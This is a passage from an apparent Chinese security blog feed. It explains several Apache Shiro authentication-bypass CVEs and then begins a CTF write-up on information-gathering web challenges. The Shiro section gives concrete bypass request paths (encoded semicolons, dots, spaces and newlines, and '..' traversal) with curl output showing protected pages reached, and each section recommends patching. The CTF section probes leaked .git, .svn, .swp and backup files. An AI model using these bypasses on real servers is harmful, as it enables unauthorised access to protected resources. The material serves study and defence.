class="headerlink" title="(CVE-2020-13933)Apacheshiro&lt;1.6.0权限绕过漏洞"></a>(CVE-2020-13933)Apacheshiro&lt;1.6.0权限绕过漏洞</h3><p>漏洞简介：<code>Apahce Shiro</code> 由于处理身份验证请求时出错 存在 权限绕过漏洞，远程攻击者可以发送特制的<code>HTTP</code>请求，绕过身份验证过程并获得对应用程序的未授权访问<br>条件：<code>ant</code>风格的路径为<code>*</code>，而<code>**</code>无法绕过。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> map.put(<span class="string">&quot;/doLogin&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"> map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line"><span class="meta">@GetMapping(&quot;/admin/1&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们访问/admin/1时会被重定向到login页面，但是访问/admin/%3b1时就可以访问到资源。</p><p>shiro 方面：<br><code>getServletPath</code>方法将<code>%3b</code>进行了解码，返回<code>/admin/;1</code>，接着调用<code>removeSemicolon</code>，该方法查找<code>;</code>，并将<code>;</code>及其之后的部分删除，于是返回<code>/admin/</code>，此时shiro拦截器配置<code>*</code>，因为/admin/和/admin/* 不匹配，所以导致shiro验证绕过，后面直接放行了</p><p>spring方面：<br>spring对URL解码后返回<code>/admin/;1</code>，之后进行路径的匹配，最终匹配到正确可访问的路径</p><p>在1.6.0版本中，shiro加入了默认<code>/**</code>匹配的配置，防止遗漏</p><p>​       </p><h3 id="CVE-2020-17510-Apacheshiro-lt-1-7-0权限绕过漏洞"><a href="#CVE-2020-17510-Apacheshiro-lt-1-7-0权限绕过漏洞" class="headerlink" title="(CVE-2020-17510)Apacheshiro&lt;1.7.0权限绕过漏洞"></a>(CVE-2020-17510)Apacheshiro&lt;1.7.0权限绕过漏洞</h3><p>本漏洞还是对AntPathMatcher的绕过，在前面CVE-2020-11989和CVE-2020-13933分别尝试了<code>/</code>的双重URL编码和 <code>;</code> 的URL编码绕过，抓住Shiro与Spring对URI处理的差异化导致的构造的URL能突破过滤，访问需要验证的资源。</p><p>CVE-2020-17510使用<code>.</code>进行绕过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shiro拦截器部分配置：</span><br><span class="line">map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line"><span class="meta">@GetMapping(&quot;/admin/&#123;name&#125;&quot;)</span><span class="comment">//路由</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">(<span class="meta">@PathVariable</span> String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;admin page&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设URL访问<code>/admin/%2e</code>当Shiro去除/和其后面字符获得的URI为<code>/admin</code>时，是无法和/hello/*匹配的，所以就在/admin后面加上<code>%2e</code>，这样Shiro解码之后变成<code>/admin/.</code>，然后路径标准化成为<code>/admin</code>，放行，这样就绕过身份验证了<br>随后进入spring，当Spring Boot版本在小于等于2.3.0.RELEASE的情况下， alwaysUseFullPath 为默认值false，这会使得其获取ServletPath，所以在路由匹配时相当于会进行路径标准化包括对 %2e 解码以及处理跨目录，这可能导致身份验证绕过。而反过来由于高版本将 alwaysUseFullPath 自动配置成了true从而开启全路径，又可能导致一些安全问题。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">在低版本spring boot下：</span><br><span class="line">$ curl -v &quot;http://127.0.0.1:8080/no-auth/%2e%2e/auth&quot;</span><br><span class="line">*   Trying 127.0.0.1...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)</span><br><span class="line">&gt; GET /no-auth/%2e%2e/auth HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1:8080</span><br><span class="line">&gt; User-Agent: curl/7.64.1</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt;</span><br><span class="line">&lt; HTTP/1.1 200</span><br><span class="line">&lt; Content-Type: text/plain;charset=UTF-8</span><br><span class="line">&lt; Content-Length: 4</span><br><span class="line">&lt; Date: Wed, 14 Apr 2021 13:22:03 GMT</span><br><span class="line">&lt;</span><br><span class="line">* Connection #0 to host 127.0.0.1 left intact</span><br><span class="line">auth</span><br><span class="line">* Closing connection 0</span><br><span class="line">   </span><br><span class="line">//因为%2e%2e造成跨目录访问成功。低版本对路径标准化包括对解码以及处理跨目录即如果存在则返回上一级目录</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">在高版本spring boot下：</span><br><span class="line">$ curl -v http://127.0.0.1:8080/admin/%2e</span><br><span class="line">*   Trying 127.0.0.1...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)</span><br><span class="line">&gt; GET /admin/%2e HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1:8080</span><br><span class="line">&gt; User-Agent: curl/7.64.1</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt;</span><br><span class="line">&lt; HTTP/1.1 200</span><br><span class="line">&lt; Content-Type: text/plain;charset=UTF-8</span><br><span class="line">&lt; Content-Length: 10</span><br><span class="line">&lt; Date: Wed, 14 Apr 2021 13:48:33 GMT</span><br><span class="line">&lt;</span><br><span class="line">* Connection #0 to host 127.0.0.1 left intact</span><br><span class="line">admin page* Closing connection 0</span><br><span class="line">//与CVE-2020-17510配合，造成未授权资源的访问</span><br></pre></td></tr></table></figure><p>建议修复方式安装修补补丁或者更新到最新版。</p><p>​      </p><h3 id="CVE-2020-17523-Apacheshiro-lt-1-7-1权限绕过漏洞"><a href="#CVE-2020-17523-Apacheshiro-lt-1-7-1权限绕过漏洞" class="headerlink" title="(CVE-2020-17523)Apacheshiro&lt;1.7.1权限绕过漏洞"></a>(CVE-2020-17523)Apacheshiro&lt;1.7.1权限绕过漏洞</h3><p>本漏洞使用<strong>编码空格</strong>的方式可以绕过验证。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shiro拦截器部分配置：</span><br><span class="line">map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line"><span class="meta">@GetMapping(&quot;/admin/&#123;name&#125;&quot;)</span><span class="comment">//路由</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">(<span class="meta">@PathVariable</span> String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;admin page&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们访问<code>/admin/1</code>,会提示登录，但是访问<code>/admin/%20</code>就可以访问到资源<br>Shiro的校验uri的函数为<code>PathMatches</code>，当<code>PathMatches</code>返回<code>true</code>时才会进入鉴权。而在<code>trim()</code>函数去掉了空格，导致PathMatches<code>(&quot;/admin/*&quot;,&quot;/admin/ &quot;)</code> 匹配失败返回了 <code>false</code>，直接就是没有进行鉴权操作，shiro放行。而spring则可以访问正常</p><p>建议修复方式安装修补补丁或者更新到最新版。</p><p>​      </p><h3 id="CVE-2021-41303-Apacheshiro-lt-1-8-0权限绕过漏洞"><a href="#CVE-2021-41303-Apacheshiro-lt-1-8-0权限绕过漏洞" class="headerlink" title="(CVE-2021-41303)Apacheshiro&lt;1.8.0权限绕过漏洞"></a>(CVE-2021-41303)Apacheshiro&lt;1.8.0权限绕过漏洞</h3><p>本漏洞通过对uri尾部添加<code>/</code>进行绕过</p><p>shiro在1.7.1的时候，对URI的处理是这样的，先是对pathPattern和requestURI进行比较，如果比较成功，返回：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filterChainManager.proxy(originalChain, pathPattern);</span><br></pre></td></tr></table></figure><p>如果不成功则对删除尾部斜线的pathPattern和requestURI进行比较，比较成功，跳出循环，返回：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filterChainManager.proxy(originalChain, requestURINoTrailingSlash);</span><br></pre></td></tr></table></figure><p>shiro鉴权是会按顺序进行匹配的，如果有以下配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> map.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line"> map.put(<span class="string">&quot;/admin/page&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"><span class="meta">@GetMapping(&quot;/admin/&#123;name&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总的说我们访问<code>/admin/page/</code>，先与<code>/admin/*</code>匹配不成功，然后对URL去掉末尾斜杠之后再一次回到拦截器进行<code>/admin/page</code>的匹配，匹配成功”anon”，绕过成功。</p><p>建议修复方式安装修补补丁或者更新到最新版。</p><p>​      </p><h3 id="CVE-2022-32532-Apacheshiro-lt-1-9-1权限绕过漏洞"><a href="#CVE-2022-32532-Apacheshiro-lt-1-9-1权限绕过漏洞" class="headerlink" title="(CVE-2022-32532)Apacheshiro&lt;1.9.1权限绕过漏洞"></a>(CVE-2022-32532)Apacheshiro&lt;1.9.1权限绕过漏洞</h3><p>shiro官方披露：RegexRequestMatcher 可能会被错误地配置为在某些 servlet 容器上被绕过。在正则表达式中使用带有“.”的 RegExPatternMatcher 的应用程序可能容易受到授权绕过的攻击。该漏洞的利用所需的条件是不易达到的用户配置。在Shiro源码中的一个类：RegExPatternMatcher ，这个类的Pattern存在带<code>.</code>的正则表达式匹配，而在java中的正则默认情况下<code>.</code>是不会包含<code>\n</code>，<code>\r</code>字符的，也就是在正则表达式中元字符<code>.</code>是匹配除换行符（<code>\n</code>、<code>\r</code>）之外的任何单个字符的，因此在一些场景中，使用正则<code>.</code>的规则就有可能被绕过。</p><p>环境：<br>配置了/permit/{value}这样从路径取参数的路由<br>配置了/permit/*这样的通配路由</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(path = &quot;/permit/&#123;value&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">permit</span><span class="params">(<span class="meta">@PathVariable</span> String value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="meta">@RequestMapping(path = &quot;/permit/*&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">permit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置的目的是拦截<code>/permit/</code>下的所有访问。<br>正如分析所示，直接访问<code>/permit/any</code>会被拦截<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro2022-32532-1.png"></p><p>​      </p><p>构造换行符进行漏洞利用绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">换行(回车)：%0a或%0d</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro2022-32532-2.png"></p><p>当访问<code>/permit/a%0any</code>或<code>/permit/a%0dny</code>时，返回success，即认证成功。<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro2022-32532.png"></p><p>建议修复方式安装修补补丁或者更新到最新版。</p><p>​     </p><h3 id="CVE-2022-40664-Apacheshiro-lt-1-10-0权限绕过漏洞"><a href="#CVE-2022-40664-Apacheshiro-lt-1-10-0权限绕过漏洞" class="headerlink" title="(CVE-2022-40664)Apacheshiro&lt;1.10.0权限绕过漏洞"></a>(CVE-2022-40664)Apacheshiro&lt;1.10.0权限绕过漏洞</h3><p>该漏洞shiro官方是这么描述的： Apache Shiro低于1.10.0，通过RequestDispatcher转发或包含时Shiro中的身份验证绕过漏洞。<br>分析Github上的shiro官方仓库中的commit，来查看1.10.0版本与上一版本的代码变更情况：<a href="https://link.juejin.cn/?target=https://github.com/apache/shiro/commit/28e10e0ca1cdcd2cede86802fde8464b29265fc8%23diff-9c5fb3d1b7e3b0f54bc5c4182965c4fe1f9023d449017cece3005d3f90e8e4d8">GitHub-Commit-Shiro</a></p><p>在更新代码的注释中有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*设置过滤器是每次请求执行一次，还是每次调用过滤器时执行一次。建议使用</span><br><span class="line">*如果您正在使用&#123;@link javax.servlet.RequestDispatcher RequestDisputcher&#125;转发，请保持禁用状态</span><br><span class="line">*或包含请求（JSP标记、编程方式或通过框架）。</span><br><span class="line">*@param filterOncePerRequest此筛选器是否每个请求执行一次。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看出此次更新禁用了javax.servlet.RequestDispatcher RequestDisputcher（Java请求转发功能），不难理解本漏洞是Java请求转发绕过了Shiro的过滤器，从而达到身份绕过！</p><p>RequestDispatcher定义了两个方法分别为forward和include：<br>在shiro1.10.0在spring项目中是默认不拦截forward和include方法的，而在新版本中新增加了ShiroFilterConfiguration类，可以通过这个类来设置外部的过滤器来禁用forward和include方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">spring中的controller接口配置：</span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line">以下使用forward函数进行接口的转发</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroVulncontroller</span> </span>&#123;</span><br><span class="line"><span class="meta">@PostMapping(&quot;/shiro/authPassVuln&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">authPassoLnTest</span><span class="params">(<span class="meta">@RequestParam</span> String str， HttpServletRequest request，HttpServletResponse response)</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;*********身份验证绕过成功*********&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;forward:/shiro/authNoPass&quot;</span>;</span><br><span class="line"></span><br><span class="line">以下不使用转发，会被拦截检测</span><br><span class="line"><span class="meta">@PostMapping(&quot;/shiro/authNoPassVuln&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">authPassNovuLnTest</span><span class="params">(<span class="meta">@RequestParam</span> String str， HttpServletRequest request，HttpServletResponse response)</span></span>&#123;</span><br><span class="line">system.out.println(<span class="string">&quot;*****身份验证绕过失败********&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;authNoPass&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一种方式会绕过shiro检测访问成功，而第二种则会访问失败</p><p>建议修复方式安装修补补丁或者更新到最新版。</p><p>​       </p><h3 id="CVE-2023-22602-Apacheshiro-lt-1-11-0-amp-Spring-Boot-2-6-鉴权绕过权限绕过漏洞"><a href="#CVE-2023-22602-Apacheshiro-lt-1-11-0-amp-Spring-Boot-2-6-鉴权绕过权限绕过漏洞" class="headerlink" title="(CVE-2023-22602)Apacheshiro &lt; 1.11.0 &amp; Spring Boot 2.6+ 鉴权绕过权限绕过漏洞"></a>(CVE-2023-22602)Apacheshiro &lt; 1.11.0 &amp; Spring Boot 2.6+ 鉴权绕过权限绕过漏洞</h3><blockquote><p>该漏洞官方是这么描述的：将 1.11.0 之前的 Apache Shiro 与 Spring Boot 2.6+ 一起使用时，巧尽心思构建的 HTTP 请求可能会导致身份验证绕过。当 Shiro 和 Spring Boot 使用不同的模式匹配技术时，会发生身份验证绕过。</p></blockquote><p>意思就是shiro 在 1.11.0版本之前，当与spring boot 2.6以上版本组合使用的时候，在默认配置下，配合特定的路由规则，攻击者可以通过发送特殊的请求造成shiro中的鉴权绕过。</p><p>Shiro和Spring Boot &lt; 2.6 都默认为 Ant 样式模式匹配。缓解措施：更新到 Apache Shiro 1.11.0，或设置以下 Spring 引导配置值：“spring.mvc.pathmatch.matching-strategy = ant_path_matcher”</p><p>首先，了解一下spring＋shiro对请求的大致处理过程：<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2022/shiro2023-22602.png"></p><p>在spring的两种路由匹配模式中，spring2.6+后，path_pattern_parser为默认配置。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ant_path_matcher中`?`匹配单个字符，`*`匹配单级目录，`**`匹配多级目录。</span><br><span class="line">path_pattern_parser支持`&#123;*name&#125;`获取多级变量，并且`**`后面不能再有其他东西。</span><br></pre></td></tr></table></figure><p>对于请求<code>/a/../admin</code>，shiro和ant_path_matcher得到的uri为<code>/admin</code>，而path_pattern_parser得到的应该是原值。</p><p>因为spring存在两种路由匹配模式，当spring中使用path_pattern_parser配置的时候，就会造成在shiro和spring中路由分发时候获取uri时的结果差异，这就可能造成对shiro的绕过。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shiro有以下配置：</span><br><span class="line">DefaultShiroFilterChainDefinition chainDefinition = <span class="keyword">new</span> DefaultShiroFilterChainDefinition();</span><br><span class="line">chainDefinition.addPathDefinition(<span class="string">&quot;/login.html&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">chainDefinition.addPathDefinition(<span class="string">&quot;/logout&quot;</span>, <span class="string">&quot;logout&quot;</span>);</span><br><span class="line">chainDefinition.addPathDefinition(<span class="string">&quot;/admin/**&quot;</span>, <span class="string">&quot;roles[admin]&quot;</span>);</span><br><span class="line">chainDefinition.addPathDefinition(<span class="string">&quot;/guest/**&quot;</span>, <span class="string">&quot;roles[guest]&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">spring的controller有一以下配置：</span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountInfoController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/admin/**&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">home</span><span class="params">(Model model)</span> </span>&#123;</span><br><span class="line">        String name = <span class="string">&quot;hello admin&quot;</span>;</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line">        PrincipalCollection principalCollection = subject.getPrincipals();</span><br><span class="line">        <span class="keyword">if</span> (principalCollection != <span class="keyword">null</span> &amp;amp;&amp;amp; !principalCollection.isEmpty()) &#123;</span><br><span class="line">            name = principalCollection.getPrimaryPrincipal().toString();</span><br><span class="line">        &#125;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;name&quot;</span>, name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;account-info&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们想要访问home，身份必须是admin，直接访问<code>/admin</code>肯定是不行的，但是我们上面知道shiro会解析<code>.</code>和<code>..</code>而spring不会，那么我们访问<code>/admin/..</code>，则会绕过shiro，到达spring匹配成功，访问到需要admin权限的资源。 shiro处理后得到的uri是<code>/</code>而已，等到了spring处理时得到的uri是<code>/admin/**</code>路由下的。</p><p>建议修复方式安装修补补丁或者更新到最新版。</p>]]></content>
      
      
      <categories>
          
          <category> 安全框架 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web练习题</title>
      <link href="/post/2/"/>
      <url>/post/2/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>菜鸡小白，日常<strong>练练web</strong></p><h2 id="信息收集（1-20）"><a href="#信息收集（1-20）" class="headerlink" title="信息收集（1-20）"></a>信息收集（1-20）</h2><p>​       </p><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>查看网站源码即可拿到 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web1.png"></p><p>​       </p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>无法使用右键查看源代码，可以在 URL 前添加 <code>view-source:</code>查看源代码<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web2.png"></p><p>​      </p><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>查看源码无果，尝试查看请求头与响应头，在响应头中看到了 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web3.png"></p><p>​      </p><p>使用BP抓包也是一样的效果    <img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web3%EF%BC%881%EF%BC%89.png"></p><p>​       </p><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>题目提示robots:</p><blockquote><p>robots协议（也称爬虫协议，机器人协议等）的全称是“网络爬虫排除协议”，网站通过robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。规定只能小写且为 txt 文件</p></blockquote><p>访问网站的 robots.txt 看到放置 flag 的文件<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web4.png"></p><p>​          </p><p>访问放置 flag 的文件，看到 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web4(1).png"></p><p>​         </p><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>题目提示 phps 源码泄露，index.php 是当前页面，所以我们修改一下访问 index.phps </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1b24977f-7280-490e-a21f-377af3512a46.challenge.ctf.show/index.phps</span><br></pre></td></tr></table></figure><p>提示下载。我们下载后打开，即可看到 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web5.png"></p><p>​          </p><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>题目提示 “源码解压到当前目录，收工”  说明 <a href="http://www.zip/">www.zip</a> 压缩包还放在站点下，我们构造 URL 访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://574a895f-82cb-4bad-b6a4-df14e4f73843.challenge.ctf.show/www.zip</span><br></pre></td></tr></table></figure><p>下载，打开可以看到 fl000g.txt<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web6.png"></p><p>​          </p><p>但是这不是 flag，提交时显示错误，于是我们访问 fl000g.txt 得到真正的 flag </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://574a895f-82cb-4bad-b6a4-df14e4f73843.challenge.ctf.show/fl000g.txt</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>题目提示 “ 版本控制很重要，但不要部署到生产环境更重要 ”</p><p>由于我水平有限，版本控制系统 首先联想到的是 git，这题可能是有关 git 泄露问题</p><blockquote><p>在运行 git init 初始化代码库的时候，会在当前目录下面产生一个.git 的隐藏目录，用来记录代码的变更记录等等。<br>在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p></blockquote><p>于是访问 <code>.git/index.php</code> 构造 URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://5fc191d6-fc10-4e6b-8dd7-8257ad22c140.challenge.ctf.show/.git/index.php</span><br></pre></td></tr></table></figure><p>很巧就出了 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web7.png"></p><p>​      </p><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>提示和 web7 一样，但使用同样的方式是行不通了。查阅资料有关 版本控制系统 的发现还有 SVN 源码泄露的漏洞，</p><blockquote><p>资料显示：<br>  在使用SVN(subversion)管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得渗透工程师可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构。在服务器上布署代码时。如果是使用 svn checkout 功能来更新代码，而没有配置好目录访问权限，则会存在此漏洞。黑客利用此漏洞，可以下载整套网站的源代码。</p></blockquote><p>与 git 相似，我们访问 .svn 构造 URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f135f114-0527-457c-871d-0aec223a5913.challenge.ctf.show/.svn/</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web8.png"></p><p>​      </p><h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p>题目提示 “ 使用vim 编辑时意外退出” ，所以是 vim 造成的泄露。</p><blockquote><p>资料显示：<br>vim是一款编辑工具，当你非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。意思就是使用vim 编辑 意外退出会产生临时文件</p><p>需要注意的是如果你并没有对文件进行修改，而只是读取文件，是不会产生<code>.swp</code>文件的。</p></blockquote><p>我们访问文件 <code>index.php.swp</code> 构造 URL </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://872954f8-ed97-4e44-96b3-b6333548bd28.challenge.ctf.show/index.php.swp</span><br></pre></td></tr></table></figure><p>下载文件，打开即可看到 flag</p><p>​      </p><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>题目提示 ”cookie“  所以我们查看本地存储的 cookie<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web10.png"></p><p>​       </p><p>进行一下 URL 解码，拿到 flag<br><img src="https://gcore.jsdelivr.net/gh/MTRleed/PicGo/file/web10(1).png"></p><p>​       </p><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>题目提示 “域名其实也可以隐藏信息，比如 ctfshow.com 就隐藏了一条信息”  